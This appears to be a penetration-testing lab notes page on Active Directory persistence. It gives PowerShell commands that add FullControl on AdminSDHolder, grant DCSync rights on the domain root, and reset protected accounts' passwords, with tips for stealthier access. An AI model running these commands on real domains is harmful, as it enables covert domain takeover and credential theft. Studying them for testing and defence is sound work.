# ACLs

## AdminSDHolder

In Active Directory, the [**`AdminSDHolder`**](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory#adminsdholder) object is a critical mechanism for securing privileged accounts. Located within the System container of a domain, `AdminSDHolder` acts as a template for Access Control Lists (ACLs) applied to members of [Protected Groups](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory#protected-groups)â€”such as Domain Admins (DA), Enterprise Admins (EA), and others. **This object is owned by the DA group**, though the Local Administrators and EA groups can also assume ownership.

The [Security Descriptor Propagator](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory#sdprop) (`SDPROP`) is a built-in process that runs every 60 minutes. It synchronizes the ACLs of protected users and groups by overwriting their security descriptors with the one set on `AdminSDHolder`. Any changes made directly to these group ACLs will be reverted.

An attacker with DA privileges can alter the `AdminSDHolder` ACL to include a compromised user account with full access rights. This ensures that `SDPROP` will propagate those rights to all protected accounts on each run.

{% tabs %}
{% tab title="PowerView" %}
Add `FullControl` permissions to the `AdminSDHolder` object (as a DA):

{% code overflow="wrap" fullWidth="false" %}
```powershell
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student337 -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local
```
{% endcode %}

Confirm the modification:

{% code overflow="wrap" %}
```powershell
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "student337"}
```
{% endcode %}

Instead of granting full rights via `GenericAll`, specific permissions like `ResetPassword` or `WriteMembers` can be used for more stealthy access:

{% code overflow="wrap" %}
```powershell
# Abuse the ResetPassword permissions
Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString "P@assw0rd123!" -AsPlainText -Force) -Verbose
```
{% endcode %}
{% endtab %}

{% tab title="AD & RACE" %}
Add `FullControl` permissions to the `AdminSDHolder` object (as a DA) using the AD module and [RACE toolkit](https://github.com/samratashok/RACE)

{% code overflow="wrap" %}
```powershell
Set-DCPermissions -Method AdminSDHolder -SAMAccountName student337 -Right GenericAll -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local'
```
{% endcode %}

Confirm the modification:

{% code overflow="wrap" %}
```powershell
(Get-Acl -Path 'AD:\CN=Domain Admins, CN=Users, DC=dollarcorp, DC=moneycorp, DC=local').Access | ?{$_.IdentityReference -match 'student337'}
```
{% endcode %}

Instead of granting full rights via `GenericAll`, specific permissions like `ResetPassword` or `WriteMembers` can be used for more stealthy access:

{% code overflow="wrap" %}
```powershell
# Abuse the ResetPassword permissions
Set-ADAccountPassword -Identity testda -NewPassword (ConvertTo-SecureString "P@assw0rd123!" -AsPlainText -Force) -Verbose
```
{% endcode %}
{% endtab %}
{% endtabs %}

## Domain Root

Beyond `AdminSDHolder`, a user with DA privileges can **manipulate ACLs on the domain root** to escalate or persist access.

{% tabs %}
{% tab title="PowerView" %}
{% code overflow="wrap" %}
```powershell
# Assign FullControl rights
Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student337 -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local

# Assign DCSync rights
Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student337 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local
```
{% endcode %}
{% endtab %}

{% tab title="AD module & RACE" %}


{% code overflow="wrap" %}
```powershell
# Assign FullControl rights
Set-ADACL -SamAccountName student337 -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -Right GenericAll -Verbose

# Assign DCSync rights
Set-ADACL -SamAccountName student337 -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -GUIDRight DCSync -Verbose
```
{% endcode %}
{% endtab %}
{% endtabs %}
